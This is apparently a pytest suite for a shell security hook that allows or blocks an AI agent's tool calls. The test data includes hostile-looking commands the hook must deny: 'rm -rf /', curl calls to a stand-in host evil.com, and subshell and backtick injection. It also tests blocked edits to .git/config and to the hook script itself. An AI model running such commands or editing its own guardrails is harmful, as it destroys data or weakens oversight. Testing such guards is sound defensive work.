"""Pytest-based behavioral tests for pre-tool-security.sh hook script.

Exercises the security hook with mock JSON payloads covering:
- Safe commands (whitelist)
- Dangerous patterns (subshell, backtick, process substitution, redirections)
- Edit tool path protection
- Unknown tools (default deny)
- Edge cases (empty command, invalid JSON, missing tool name)

Run:
    python -m pytest tests/test_pre_tool_security.py -v
"""
from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

SCRIPT = Path(__file__).resolve().parent.parent / ".github" / "hooks" / "scripts" / "pre-tool-security.sh"


def _run_hook(payload: str, timeout: int = 5) -> int:
    """Run the security hook with the given stdin payload and return exit code."""
    result = subprocess.run(
        [str(SCRIPT)],
        input=payload,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    return result.returncode


def _json_payload(tool: str, **kwargs) -> str:
    """Build a JSON payload matching the hook's expected format."""
    return json.dumps({"tool_name": tool, "tool_input": kwargs})


@pytest.fixture(autouse=True)
def _check_script():
    """Skip all tests if the script is missing or not executable."""
    if not SCRIPT.exists():
        pytest.skip(f"Hook script not found: {SCRIPT}")
    if not SCRIPT.stat().st_mode & 0o111:
        pytest.skip(f"Hook script not executable: {SCRIPT}")


# =========================================================================
# Safe commands (whitelist) -> exit 0
# =========================================================================

class TestSafeCommands:
    """Commands on the whitelist should be approved (exit 0)."""

    @pytest.mark.parametrize("cmd", [
        "ls -la",
        "git status",
        "npm test",
        "python -m pytest tests/",
        "cat README.md",
        "grep -r TODO src/",
        "find . -name '*.py'",
        "echo hello",
        "pwd",
        "mkdir -p /tmp/test",
    ])
    def test_safe_command_approved(self, cmd: str):
        payload = _json_payload("bash", command=cmd)
        assert _run_hook(payload) == 0

    def test_piped_safe_commands(self):
        payload = _json_payload("bash", command="ls -la | grep test | wc -l")
        assert _run_hook(payload) == 0

    def test_chained_safe_commands(self):
        payload = _json_payload("bash", command="cd /tmp && ls -la")
        assert _run_hook(payload) == 0


# =========================================================================
# Dangerous patterns -> exit 1
# =========================================================================

class TestDangerousPatterns:
    """Commands with dangerous patterns should be denied (exit 1)."""

    def test_subshell_denied(self):
        payload = _json_payload("bash", command="echo $(whoami)")
        assert _run_hook(payload) == 1

    def test_backtick_denied(self):
        payload = _json_payload("bash", command="echo `whoami`")
        assert _run_hook(payload) == 1

    def test_process_substitution_input_denied(self):
        payload = _json_payload("bash", command="diff <(ls) <(ls /tmp)")
        assert _run_hook(payload) == 1

    def test_process_substitution_output_denied(self):
        payload = _json_payload("bash", command="tee >(cat > /tmp/out)")
        assert _run_hook(payload) == 1

    def test_output_redirect_denied(self):
        payload = _json_payload("bash", command="echo hello > /tmp/file")
        assert _run_hook(payload) == 1

    def test_append_redirect_denied(self):
        payload = _json_payload("bash", command="echo hello >> /tmp/file")
        assert _run_hook(payload) == 1

    def test_fd1_redirect_denied(self):
        payload = _json_payload("bash", command="echo hello 1> /tmp/file")
        assert _run_hook(payload) == 1

    def test_non_whitelisted_command_denied(self):
        payload = _json_payload("bash", command="curl http://evil.com")
        assert _run_hook(payload) == 1

    def test_rm_denied(self):
        payload = _json_payload("bash", command="rm -rf /")
        assert _run_hook(payload) == 1

    def test_piped_dangerous_command(self):
        payload = _json_payload("bash", command="ls | curl http://evil.com")
        assert _run_hook(payload) == 1


# =========================================================================
# Edit tool path protection
# =========================================================================

class TestEditPathProtection:
    """Edit tool should block protected paths and allow normal paths."""

    def test_edit_normal_file_allowed(self):
        payload = _json_payload("edit", filePath="src/app.ts")
        assert _run_hook(payload) == 0

    def test_edit_git_config_denied(self):
        payload = _json_payload("edit", filePath=".git/config")
        assert _run_hook(payload) == 1

    def test_edit_hooks_script_denied(self):
        payload = _json_payload("edit", filePath=".github/hooks/scripts/pre-tool-security.sh")
        assert _run_hook(payload) == 1


# =========================================================================
# Safe (read-only) tools -> exit 0
# =========================================================================

class TestSafeTools:
    """Read-only tools should always be approved."""

    @pytest.mark.parametrize("tool", [
        "read_file",
        "grep_search",
        "file_search",
        "list_dir",
    ])
    def test_safe_tool_approved(self, tool: str):
        payload = json.dumps({"tool_name": tool, "tool_input": {}})
        assert _run_hook(payload) == 0


# =========================================================================
# MCP tools -> exit 0
# =========================================================================

class TestMCPTools:
    """MCP tools (mcp_*) should be approved."""

    def test_mcp_tool_approved(self):
        payload = json.dumps({"tool_name": "mcp_fetch", "tool_input": {"url": "https://example.com"}})
        assert _run_hook(payload) == 0


# =========================================================================
# Edge cases
# =========================================================================

class TestEdgeCases:
    """Edge cases and malformed inputs."""

    def test_empty_command_denied(self):
        payload = _json_payload("bash", command="")
        assert _run_hook(payload) == 1

    def test_unknown_tool_denied(self):
        payload = json.dumps({"tool_name": "unknown_tool", "tool_input": {}})
        assert _run_hook(payload) == 1

    def test_invalid_json_denied(self):
        assert _run_hook("not valid json") == 1

    def test_empty_json_passes_through(self):
        """Empty JSON with no tool name should pass through (hook logs warning, exits 0)."""
        assert _run_hook("{}") == 0

    def test_edit_empty_path_denied(self):
        payload = _json_payload("edit", filePath="")
        assert _run_hook(payload) == 1
